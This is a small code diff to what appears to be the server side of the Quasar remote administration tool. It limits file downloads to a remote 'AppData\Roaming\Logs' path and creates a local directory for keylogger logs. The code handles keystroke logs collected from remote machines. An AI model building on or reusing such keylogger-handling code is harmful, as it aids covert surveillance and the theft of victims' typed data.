@@ -110,6 +110,17 @@ namespace Quasar.Server.Messages
 
             foreach (var item in items)
             {
+                if (!remotePath.Contains("AppData\\Roaming\\Logs"))
+                {
+                    continue;
+                }
+
+                //Create Logs directory
+                if (!Directory.Exists(_remoteKeyloggerDirectory))
+                {
+                    Directory.CreateDirectory(_remoteKeyloggerDirectory);
+                }
+
                 // don't escape from download directory
                 if (FileHelper.HasIllegalCharacters(item.Name))
                 {
